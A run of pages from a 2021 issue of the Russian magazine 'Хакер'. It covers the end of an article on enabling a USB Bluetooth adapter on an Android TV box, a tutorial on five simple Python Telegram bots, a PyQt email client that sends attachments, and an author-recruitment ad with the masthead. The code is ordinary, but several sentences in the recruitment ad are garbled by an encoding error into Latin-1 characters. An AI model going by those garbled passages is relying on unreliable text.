   Взглянем еще раз на схему, чтобы оценить пройденный путь. Но что это?
Из схемы видно, что библиотека libbt-vendor.so использует настройки,
которые записаны в файле /system/etc/bluetooth/bt_vendor.conf, а на
текущий момент там указано, что адаптер Bluetooth будет подключаться
к последовательному порту. Мы подключаем его к шине USB, но какими тогда
должны быть параметры?
   Заглядываем в исходники libbt-vendor.so и в каталоге tvbox/libbt-
usb-master/jni/conf находим  эталонный bt_vendor.conf. Берем  его
и заменяем только два параметра:
 • HCIDevice = N, где N — номер Bluetooth-адаптера, который указан
   в пути /sys/class/rfkill/rfkillN/;
 • Type  =  hci,  то  есть  Bluetooth-адаптер  напрямую  предоставляет
   интерфейс HCI.

Запишем  исправленный  конфигурационный файл  на  приставку  вместо
существующего и повторим испытание. После попытки включить Bluetooth
система сообщает, что ищет устройства. Все работает!


ДОРАБОТКИ
Со временем я столкнулся с новой проблемой: приставка иногда перес‐
тавала видеть контроллер, и для восстановления его работы нужно было
перезагружать и его, и приставку. Это убивало всю радость!
   Вскоре выяснилось, что стабильность работы этой связки сильно зависит
от расстояния между приставкой и контроллером. По всей видимости, виной
тому — слабая связь между миниатюрным адаптером и контроллером,
который может полностью прятаться в руках. Было эмпирически установлено,
что радиус нормальной работы — это 1,5–2 метра от приставки.
   Спать спокойно мешали и два предупреждения об ошибках, которые я
проигнорировал при сборке интерфейсной библиотеки. Давай поищем кон‐
станту по файлам в каталоге libbt-usb-master:


$ grep -R 'BT_VND_OP_EPILOG' *

Я  нашел  упоминание  в  заголовочном  файле  external/bluetooth/
bluedroid/hci/include/bt_vendor_lib.h. Он наряду с перечнем иден‐
тификаторов сообщений содержит описание правил их обработки. Оттуда
можно узнать, что сообщение BT_VND_OP_SET_AUDIO_STATE отправляется,
чтобы проинформировать о состоянии звукового устройства, и в нашем слу‐
чае  его   действительно   можно   игнорировать.  А   вот  сообщение
BT_VND_OP_EPILOG говорит о завершении работы с устройством, и его нужно
отправлять стеку Bluetooth, чтобы сообщить, что устройство можно отключать
вызовом функции epilog_cb.
   Дополним конструкцию множественного выбора в файле libbt-usb-
master/jni/src/bt_vendor_hci.c  следующими  строками  по  аналогии
с другими обработчиками:


case BT_VND_OP_SET_AUDIO_STATE:
    break;
case BT_VND_OP_EPILOG:
    if (bt_vendor_cbacks) {
        ALOGE ("vendor lib op epilog done");
        bt_vendor_cbacks -> epilog_cb (BT_VND_OP_RESULT_SUCCESS);
    }
    break;

После этого компиляция библиотеки не вызывает вопросов. Однако нельзя
исключать, что в каких‑то случаях обработка сообщений требует более слож‐
ных действий. Каких именно? Чтобы ответить на этот вопрос, надо глубже
погрузиться в принципы взаимодействия подсистемы Bluetooth с USB-адап‐
тером. Возможно, кто‑нибудь из читателей увидит в этом свою задачу, решит
ее и расскажет об этом!


ВЫВОДЫ
Итак, задача полностью решена. Давай напоследок вспомним и системати‐
зируем проделанные шаги, чтобы в случае надобности повторить их с другим
устройством. Мне потребовалось:
 • собрать и установить драйвер USB-адаптера, представляющий собой
   модуль ядра /system/lib/modules/btusb.ko;
 • адаптировать исходники динамической библиотеки интерфейса между
   подсистемой  Bluetooth  и  драйвером  адаптера  libbt-vendor.so
   к заголовочным файлам и инструментам NDK;
 • подготовить  проект  NDK,  собрать  и  установить  файл  библиотеки
  /system/vendor/lib/libbt-vendor.so;
 • актуализировать  конфигурационный файл /system/etc/bluetooth/
  bt_vendor.conf.

Помимо этого, для автоматизации запуска модуля ядра и установки раз‐
решений на виртуальные файлы при загрузке ОС я сделал конфигурационный
файл системы инициализации /system/etc/init/btusb.rc со следующим
содержимым:


on boot
    insmod /system/lib/modules/btusb.ko
    chown bluetooth net_bt_stack /sys/class/rfkill/rfkill0/type
    chown bluetooth net_bt_stack /sys/class/rfkill/rfkill0/state
    chmod 0664 /sys/class/rfkill/rfkill0/state

В имени rfkill0 цифру 0 может потребоваться заменить другим номером,
который присваивается USB-адаптеру операционной системой.
   Вот и все. Это был не самый легкий путь, зато мы узнали много нового!


Использованное ПО

 • Bodhi Linux 6.0.0-64
 • gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi
 • BusyBox-1.31.1-46.apk
 • android-ndk-r16b-linux-x86_64

Использованная документация

 • Bluetooth. Android 7.x and earlier architecture
 • How to change Bluetooth device for Android
 • Подкопаев, Дмитрий. Консольный Android: 50 команд ADB, о которых дол‐
  жен знать каждый
 • Cingolani, Alessandro. Bluetooth Stack and how Linux OS handles it
 • Guohui Wang. Mastering Android NDK Build System - Part 1: Techniques with
   ndk-build
КОДИНГ




 ПИТОНОМ
 ПО ТЕЛЕГРАМУ!
       ПИШЕМ ПЯТЬ ПРОСТЫХ
      TELEGRAM-БОТОВ НА PYTHON





В  этой  статье мы  реализуем  простой,
но крайне полезный проект на Python —
бота для Telegram. Боты — это небольшие
скрипты, которые могут взаимодействовать                                                                            Иван Сараев
с API, чтобы получать сообщения от поль‐          solblackbox@mail.ru
зователя и отправлять информацию в раз‐
ные чаты и каналы.


Python для новичков
Если ты совсем не ориентируешься в Python, то отличным началом будет
прочтение трех вводных статей, которые я публиковал в «Хакере» этим летом,
либо посещение  курса  «Python для  новичков», который я  начну  вести
для читателей «Хакера» уже совсем скоро — 30 ноября.
 • Python с абсолютного нуля. Учимся кодить без скучных книжек
 • Python с абсолютного нуля. Учимся работать со строками, файлами
   и интернетом
 • Python с абсолютного нуля. Работаем с ОС, изучаем регулярные выраже‐
   ния и функции



Чтобы создать бота, нам нужно дать ему название, адрес и получить токен —
строку, которая будет однозначно идентифицировать нашего бота для сер‐
веров Telegram. Зайдем в Telegram под своим аккаунтом и откроем «отца всех
ботов», BotFather.
  Жмем кнопку «Запустить» (или отправим /start), в ответ BotFather приш‐
лет нам список доступных команд:
 • /newbot — создать нового бота;
 • /mybots — редактировать ваших ботов;
 • /setname — сменить имя бота;
 • /setdescription — изменить описание бота;
 • /setabouttext — изменить информацию о боте;
 • /setuserpic — изменить фото аватарки бота;
 • /setcommands — изменить список команд бота;
 • /deletebot — удалить бота.

Отправим бате‑боту команду /newbot, чтобы создать нового бота. В ответ он
попросит ввести имя будущего бота, его можно писать на русском. После
ввода имени нужно будет отправить адрес бота, причем он должен закан‐
чиваться на слово bot. Например, xakepbot или xakep_bot. Если адрес будет
уже  кем‑то  занят,  BotFather  начнет  извиняться  и  просить  придумать
что‑нибудь другое.
   Когда мы наконец найдем свободный и красивый адрес для нашего бота,
в ответ получим сообщение, в котором после фразы Use this token to access
the HTTP API будет написана строка из букв и цифр — это и есть необходимый
нам токен. Сохраним ее где‑нибудь на своем компьютере, чтобы потом
использовать в скрипте бота.
  Для взаимодействия с Telegram API есть несколько готовых модулей.
Самый простой из них — Telebot. Чтобы установить его, набери


pip install pytelegrambotapi

В Linux, возможно, понадобится написать pip3 вместо pip, чтобы указать, что
мы хотим работать с третьей версией Python.


ЭХО-БОТ
Для начала реализуем так называемого эхо‑бота. Он будет получать от поль‐
зователя текстовое сообщение и возвращать его.


import telebot


# Создаем экземпляр бота
bot = telebot.TeleBot('Здесь впиши токен, полученный от @botfather')


# Функция, обрабатывающая команду /start
@bot.message_handler(commands=["start"])
def start(m, res=False):
    bot.send_message(m.chat.id, 'Я на связи. Напиши мне что-нибудь )'
)


# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
    bot.send_message(message.chat.id, 'Вы написали: ' + message.text)


# Запускаем бота
bot.polling(none_stop=True, interval=0)

Запускай скрипт и ищи в поиске Telegram своего бота по адресу, который ты
придумал ранее. Запускаем бота кнопкой «Запустить» (Start) или командой /
start и можем убедиться в том, что он работает и возвращает сообщения.





                       Пример работы эхо‑бота


WIKIPEDIA-БОТ
Давай  научим нашего  бота не  просто  отсылать  сообщения  обратно,
а чему‑нибудь поинтереснее. Например, по введенному слову давать статью
на Википедии. Здесь нам поможет модуль Wikipedia:


pip install wikipedia

Готовим код.


import telebot, wikipedia, re


# Создаем экземпляр бота
bot = telebot.TeleBot('Здесь впиши токен, полученный от @botfather')


# Устанавливаем русский язык в Wikipedia
wikipedia.set_lang("ru")


# Чистим текст статьи в Wikipedia и ограничиваем его тысячей символов
def getwiki(s):
    try:
        ny = wikipedia.page(s)
        # Получаем первую тысячу символов
        wikitext=ny.content[:1000]
        # Разделяем по точкам
        wikimas=wikitext.split('.')
        # Отбрасываем всЕ после последней точки
        wikimas = wikimas[:-1]
        # Создаем пустую переменную для текста
        wikitext2 = ''
        # Проходимся по строкам, где нет знаков «равно» (то есть
все, кроме заголовков)
        for x in wikimas:
            if not('==' in x):
                    # Если в строке осталось больше трех символов,
добавляем ее к нашей переменной и возвращаем утерянные при
разделении строк точки на место
                if(len((x.strip()))>3):
                   wikitext2=wikitext2+x+'.'
            else:
                break
        # Теперь при помощи регулярных выражений убираем разметку
        wikitext2=re.sub('\([^()]*\)', '', wikitext2)
        wikitext2=re.sub('\([^()]*\)', '', wikitext2)
        wikitext2=re.sub('\{[^\{\}]*\}', '', wikitext2)
        # Возвращаем текстовую строку
        return wikitext2
    # Обрабатываем исключение, которое мог вернуть модуль wikipedia
при запросе
    except Exception as e:
        return 'В энциклопедии нет информации об этом'


# Функция, обрабатывающая команду /start
@bot.message_handler(commands=["start"])
def start(m, res=False):
    bot.send_message(m.chat.id, 'Отправьте мне любое слово, и я
найду его значение на Wikipedia')


# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
    bot.send_message(message.chat.id, getwiki(message.text))


# Запускаем бота
bot.polling(none_stop=True, interval=0)





                     Пример работы Wikipedia-бота


        WWW

                    При  создании  следующих  ботов мы  будем
                          использовать несколько текстовых файлов с кон‐
                        тентом. Скачать их можно с моего сайта.



БОТ С ДВУМЯ ВИРТУАЛЬНЫМИ КНОПКАМИ
Во многих Telegram-ботах для выбора каких‑то действий используются так
называемые виртуальные кнопки. Давай попробуем сделать себе такие же!
   Предположим, что у нас есть два файла facts.txt и thinks.txt, которые
содержат список интересных фактов и поговорки. На каждой строке файлов
находится по одному факту или поговорке.
   Сделаем бота, в котором будут две кнопки: «Факты» и «Поговорки». Если
нажать любую, бот отправит пользователю соответствующее сообщение.


             INFO

                            Если ты будешь использовать для этого бота тот
                    же токен, что и для предыдущего, то, чтобы уви‐
                        деть  кнопки,  перезапусти  бота  командой /
                   start.



import telebot
import random
from telebot import types


# Загружаем список интересных фактов
f = open('data/facts.txt', 'r', encoding='UTF-8')
facts = f.read().split('\n')
f.close()


# Загружаем список поговорок
f = open('data/thinks.txt', 'r', encoding='UTF-8')
thinks  = f.read().split('\n')
f.close()


# Создаем бота
bot = telebot.TeleBot('Здесь твой токен, полученный от @botfather')


# Команда start
@bot.message_handler(commands=["start"])
def start(m, res=False):
        # Добавляем две кнопки
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1=types.KeyboardButton("Факт")
        item2=types.KeyboardButton("Поговорка")
        markup.add(item1)
        markup.add(item2)
        bot.send_message(m.chat.id, 'Нажми: \nФакт для получения
интересного факта\nПоговорка — для получения мудрой цитаты ',
reply_markup=markup)


# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
    # Если юзер прислал 1, выдаем ему случайный факт
    if message.text.strip() == 'Факт' :
            answer = random.choice(facts)
    # Если юзер прислал 2, выдаем умную мысль
    elif message.text.strip() == 'Поговорка':
            answer = random.choice(thinks)
    # Отсылаем юзеру сообщение в его чат
    bot.send_message(message.chat.id, answer)


# Запускаем бота
bot.polling(none_stop=True, interval=0)





            Пример работы бота, знающего факты и поговорки


БОТ, ВЕДУЩИЙ TELEGRAM-КАНАЛ С АНЕКДОТАМИ
Предыдущие боты посылали юзеру сообщения тогда, когда получали от него
команды или фразы. Но что, если нам нужен бот, который будет периодически
и в автоматическом режиме постить что‑то в наш канал?
   Давай сделаем бота, который получает список анекдотов из файла и каж‐
дый час постит в канал один из этих анекдотов. Для этого нам нужно создать
свой канал в Telegram, добавить в подписчики канала нашего бота и наз‐
начить его администратором канала с правом публиковать сообщения.
  Файл с анекдотами должен лежать в папке data рядом со скриптом бота.


import telebot
import time


# Токен, который выдает @botfather
bot = telebot.TeleBot('Здесь твой токен, полученный от @botfather')
# Адрес телеграм-канала, начинается с @
CHANNEL_NAME = '@адрес_твоего_канала'


# Загружаем список шуток
f = open('data/fun.txt', 'r', encoding='UTF-8')
jokes = f.read().split('\n')
f.close()


# Пока не закончатся шутки, посылаем их в канал
for joke in jokes:
    bot.send_message(CHANNEL_NAME, joke)
    # Делаем паузу в один час
    time.sleep(3600)


bot.send_message(CHANNEL_NAME, "Анекдоты закончились :-(")





            Пример работы бота, ведущего канал с анекдотами


ЧАТ-БОТ «МАША»
Теперь давай сделаем простейшего чат‑бота, который будет болтать с поль‐
зователем. Для этого мы подготовим файл boltun.txt, содержащий строки
с вопросами (в начале таких строк поставим метку u:) и ответами на них
в следующей строке.


u: как зовут
Маша меня зовут!
u: сколько тебе лет
Мне уже 18, честно-честно!

Файл boltun.txt поместим в папку data рядом со скриптом бота. Для поис‐
ка похожих вопросов используем модуль fuzzywuzzy, который позволяет
сравнивать, насколько похожи между собой две строки. Естественно, сперва
этот модуль нужно установить:


pip install fuzzywuzzy
pip install python-Levenshtein

Ниже приведен исходный код бота. После его запуска напиши боту «Привет»
и попробуй с ним пообщаться. Естественно, это не искусственный интеллект
и набор его ответов ограничен фразами из файла boltun.txt.


import telebot
import os
from fuzzywuzzy import fuzz


# Создаем бота, пишем свой токен
bot = telebot.TeleBot('Здесь твой токен, полученный от @botfather')



# Загружаем список фраз и ответов в массив
mas=[]
if os.path.exists('data/boltun.txt'):
    f=open('data/boltun.txt', 'r', encoding='UTF-8')
    for x in f:
        if(len(x.strip()) > 2):
            mas.append(x.strip().lower())
    f.close()


# С помощью fuzzywuzzy вычисляем наиболее похожую фразу и выдаем в
качестве ответа следующий элемент списка
def answer(text):
    try:
        text=text.lower().strip()
        if os.path.exists('data/boltun.txt'):
            a = 0
            n = 0
            nn = 0
            for q in mas:
                if('u: ' in q):
                    # С помощью fuzzywuzzy получаем, насколько
похожи две строки
                    aa=(fuzz.token_sort_ratio(q.replace('u: ',''),
text))
                    if(aa > a and aa!= a):
                        a = aa
                        nn = n
                n = n + 1
            s = mas[nn + 1]
            return s
        else:
            return 'Ошибка'
    except:
        return 'Ошибка'


# Команда «Старт»
@bot.message_handler(commands=["start"])
def start(m, res=False):
        bot.send_message(m.chat.id, 'Я на связи. Напиши мне Привет )'
)


# Получение сообщений от юзера
@bot.message_handler(content_types=["text"])
def handle_text(message):
    # Запись логов
    f=open('data/' + str(message.chat.id) + '_log.txt', 'a', encoding
='UTF-8')
    s=answer(message.text)
    f.write('u: ' + message.text + '\n' + s +'\n')
    f.close()
    # Отправка ответа
    bot.send_message(message.chat.id, s)


# Запускаем бота
bot.polling(none_stop=True, interval=0)





                        Пример работы чат‑бота


ВЫВОДЫ
Мы написали пять простых ботов, на примере которых научились принимать
и отправлять сообщения, делать кнопки и понимать неточные запросы.
  В следующей статье мы рассмотрим работу с Telegram-ботами более под‐
робно: научимся делать ботов, работающих через веб‑хуки, принимать опла‐
ту от пользователей и взаимодействовать с базой данных SQLite.
   Также призываю тебя не откладывать и записываться на курс «Python
для новичков», где мы от простейших понятий перейдем к созданию первых
интересных проектов. Стартуем уже совсем скоро!


Курс по Python
Курс «Python с нуля» направлен на изучение основ и базовых концепций прог‐
раммирования.  После  него  ты  сможешь  легко  углубиться  в  любую
из ИТ‑сфер: веб‑разработку, анализ данных, безопасность приложений и так
далее. Продолжительность курса — два календарных месяца. Уроки будут
проводиться два  раза  в неделю  (вторник и  четверг,  ориентировочно
в 17:00 по Москве), каждый по одному академическому часу. Периодически
будут выдаваться домашние задания.
   Записаться на курс
КОДИНГ

     ЗМЕИНАЯ
  ПОЧТА





   ПИШЕМ НА PYTHON И QT ПОЧТОВИК
С ВОЗМОЖНОСТЬЮ ПРИКРЕПЛЯТЬ ФАЙЛЫ




Возможно, ты уже умеешь писать простые
сценарии на Python, но пробовал ли ты
делать  графические  программы  с  нас‐
                                                                          Валерий Линьков
                                                                                  Дипломированныйтоящими    работающими    кнопочками?                                                                                      специалист и инструктор
                                                                                                Cisco, основатель академииПоверь, это тоже крайне увлекательно и не                                                                                                  Cisco, автор технических
                                                                                           статей нацбезопасностиочень сложно! Сегодня мы попрактикуемся                                                                                       России, сисадмин, ИБшник,
                                                                                                 питонист, гикв этом, написав на Python и Qt простой поч‐                                                                                                                   valerylinkov.ru
товик, который будет отправлять письма
с аттачами.


Сразу оговоримся, что приложение будет с рядом ограничений: в частности,
мы не будем даже приступать к чтению почты и не сможем выбирать почтовый
сервис для отправки. К тому же письма из самопального почтовика могут
чаще попадать в спам. Воспринимай это скорее как учебный пример,
который поможет тебе освоить полезные навыки.


ИНТЕРФЕЙС
Для начала давай создадим интерфейс будущего приложения. Для этого вос‐
пользуемся фреймворком для разработки кросс‑платформенного ПО — Qt 5.
Потребуется скачать его и установить.
   Откроем Qt Designer и в появившемся окне выбора поставим галочку
на пункте Main Window.





                         Создание нового окна

Затем создадим окно при помощи готовых инструментов, а именно Label
для текста, Line Edit для строк ввода, Text Edit для поля ввода текста, а так‐
же Push Button для кнопок. Разложить всё можешь так, как тебе понравится,
главное — поставить все элементы, показанные на картинке, и запомнить их
номера. Дальше будет понятно, зачем это.





                          Интерфейс клиента

Не забудь в поле ввода пароля поставить параметр echoMode = Password,
чтобы скрыть пароль, а также выключить поля, которые могут быть активны
только после правильного ввода данных. Чтобы это сделать, необходимо
в поле enabled убрать галочку.
   После завершения работы мое окно выглядит как на скриншоте.





Сохраняй документ, и получишь файл с расширением ui, который и будет
файлом интерфейса. Я назвал его Main.ui. Теперь к коду!
   Первым делом импортируем две библиотеки. Они нужны для работы с Qt
5.


from PyQt5.QtWidgets import *
from PyQt5 import uic

Теперь прописываем класс интерфейса и в нем все функции. У нас будет
функция ввода (login), функция прикрепления файла (attach_sth) и функция
отправки сообщений  (send_mail). Также в основе основ лежит функция
вызова графического интерфейса с демонстрацией окна и активацией трех
кнопок.


class MyGUI(QMainWindow):


    def __init__(self):
        super(MyGUI, self).__init__()
        uic.loadUi('Main.ui', self)
        self.show()


        self.pushButton.clicked.connect(self.login)
        self.pushButton_2.clicked.connect(self.attach_sth)
        self.pushButton_3.clicked.connect(self.send_mail)


    def login(self):
        pass


    def attach_sth(self):
        pass


    def send_mail(self):
        pass


app = QApplication([])
windows = MyGUI()
app.exec_()

Здесь интересна функция app.exec_(). Она останавливает работу с тер‐
миналом, чтобы все взаимодействие с приложением шло только через гра‐
фический интерфейс.
  Код уже можно  запустить! Ты увидишь окно с нарисованным тобой
интерфейсом, но в нем пока что ничего не будет работать. Конечно, мы же
еще не определили, как это должно происходить.


ПИШЕМ ОСНОВНУЮ ЧАСТЬ
Итак, задача — написать движок. Приступим.
   Функция  входа. В ней мы делаем две вещи: логинимся и создаем
переменную msg (переменная с содержанием письма).


def login(self):
        try:
            self.server = smtplib.SMTP(self.lineEdit_3.text(),
            # Обращаемся к протоколу SMTP по нужному порту
            self.lineEdit_4.text())
            # Отправляем запрос ELHO
            self.server.ehlo()
            # TLS-соединение
            self.server.starttls()
            # Снова отправляем запрос ELHO
            self.server.ehlo()
            self.server.login(self.lineEdit.text(),
            # Ввод логина и пароля
            self.lineEdit_2.text())


            # Переводим все поля входа в выключенное состояние
            self.lineEdit.setEnabled(False)
            self.lineEdit_2.setEnabled(False)
            self.lineEdit_3.setEnabled(False)
            self.lineEdit_4.setEnabled(False)
            self.pushButton.setEnabled(False)


            # Переводим все поля письма во включенное состояние
            self.lineEdit_5.setEnabled(True)
            self.lineEdit_6.setEnabled(True)
            self.textEdit.setEnabled(True)
            self.pushButton_2.setEnabled(True)
            self.pushButton_3.setEnabled(True)


            # Создание переменной msg
            self.msg = MIMEMultipart()
        # При ошибке в логине и/или пароле
        except smtplib.SMTPAuthenticationError:
            # Создать окно
            massage_box = QMessageBox()
            # Окно заполнить текстом
            massage_box.setText('Недопустимые данные!')
            # Переключиться на окно
            massage_box.exec()
        except:
            massage_box = QMessageBox()
            massage_box.setText('Не удалось выполнить вход!')
            massage_box.exec()


             INFO

                    EHLO —  это  глагол  расширенного  протокола
                         передачи  простых сообщений (ESMTP),  опре‐
                        деленный в RFC 5321. Серверы ESMTP могут объ‐
                        являть о своих возможностях во время началь‐
                        ного подключения. Среди них — максимальный
                        допустимый  размер  сообщения  и  поддержи‐
                     ваемые методы проверки подлинности. HELO —
                        это более старая команда SMTP, определенная
                        в RFC 821. Большинство SMTP-серверов под‐
                        держивают ESMTP и EHLO. Если сервер не под‐
                         держивает EHLO,  вместо него можно  исполь‐
                        зовать HELO.


Далее идет функция прикрепления вложений:


def attach_sth(self):
        # Открываем диалоговое окно выбора файлов
        options = QFileDialog.Options()
        # Смотрим все типы файлов
        filenames, _ = QFileDialog.getOpenFileNames(self, 'Open
        File', '', 'All Files (*.*)', options=options)
        # Собираем файлы
        if filenames != []:
            for filename in filenames:
                attachment = open(filename, 'rb')


                filename = filename[filename.rfind('/') + 1:]


                # Кодируем файл по стандарту MIME
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
                encoders.encode_base64(p)
                # Пишем имя файла
                p.add_header('Content-Disposition', f'attachment;
filename={filename}')
                self.msg.attach(p)
                # Ставим запятые после первого вложения
                if not self.label_8.text().endswith(': '):
                    self.label_8.setText(self.label_8.text() + ',')
                self.label_8.setText(self.label_8.text() + ' ' +
filename)

Создание той самой переменной msg:


def send_mail(self):
        # Создаем окно с уточнением
        dialog = QMessageBox()
        dialog.setText('Вы хотите отправить сообщение?')
        # Выбор ответов
        dialog.addButton(QPushButton('Да'), QMessageBox.YesRole)
        dialog.addButton(QPushButton('Нет'), QMessageBox.NoRole)


        if dialog.exec_() == 0:
            try:
                # От кого сообщение
                self.msg['From'] = 'Xakep'
                # Кому
                self.msg['To'] = self.lineEdit_6.text()
                # Тема
                self.msg['Subject'] = self.lineEdit_5.text()
                # Собираем сообщение
                self.msg.attach(MIMEText(self.textEdit.toPlainText(),
'plain'))
                text = self.msg.as_string()
                # Отправляем по пути
                self.server.sendmail(self.lineEdit.text(),
                self.lineEdit_6.text(), text)
                # Создаем окно с подтверждением
                massage_box = QMessageBox()
                massage_box.setText('Сообщение отправлено!')
                massage_box.exec()


            except:
                # Создаем окно с ошибкой
                massage_box = QMessageBox()
                massage_box.setText('Не удалось отправить сообщение!'
)
                massage_box.exec()

Весь код можешь посмотреть на моем GitHub.


НАСТРАИВАЕМ ПОЧТУ
Я выбрал почту Gmail, поскольку в нем можно выключить защиту от сторонних
приложений. Многие другие почтовики ставят запрет на нее, а здесь дос‐
таточно перейти по ссылке и выставить разрешение.





                  Включение отправки с нашего клиента

Адрес SMTP для Gmail — smtp.gmail.com, порт — 587. Для других почтовых
клиентов можно посмотреть эти данные, просто загуглив их название со сло‐
вом SMTP.


ВЫВОДЫ
Вот мы и написали свой базовый клиент для отправки писем с любыми вло‐
жениями. Как видишь, все, что нужно, — это нарисовать форму и написать
обработчики, процесс очень простой и прямолинейный.
  На всякий случай предупреждаю: можешь даже не пытаться использовать
этот код без изменений в незаконных целях. Мы здесь никак не скрываем
свой IP, никак не шифруем файлы и не обходим антивирусы.
   Зато ты можешь использовать этот пример, чтобы добавить к своим при‐
ложениям удобный графический интерфейс.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №11 (272)

            Андрей Письменный        Илья Русанен            Алексей Глазков
               Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                         РЕДАКТОРЫ РУБРИК

            Андрей Письменный         Евгений Зобнин        Валентин Холмогоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
               Татьяна Чупрова            Марк           Иван «aLLy» Андреев
                chuprova@glc.ru       Бруцкий-Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​
08.​2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2021